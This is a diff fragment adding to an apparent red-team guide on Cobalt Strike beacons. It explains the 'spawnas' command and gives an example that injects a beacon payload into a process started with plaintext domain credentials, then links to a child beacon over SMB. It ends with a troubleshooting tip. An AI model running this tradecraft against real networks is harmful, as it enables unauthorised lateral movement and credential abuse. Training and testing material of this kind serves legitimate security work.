@@ -87,6 +87,14 @@ To that reason we need to spawn another beacon.
 ```
 beacon> spawn
 ```
+The `spawnas` command will spawn a new process using plaintext credentials and will inject a beacon payload into it.
+
+```
+beacon> spawnas CORP\user Passw0rd! smb-p2p-payload
+[+] established link to child beacon: 10.10.10.10
+```
+
+> **Note**: A common mistake is to attempt this from a directory where te user does not have read access. Change directory to `C:\` and try it again.
 
 # PowerShell Remoting
 
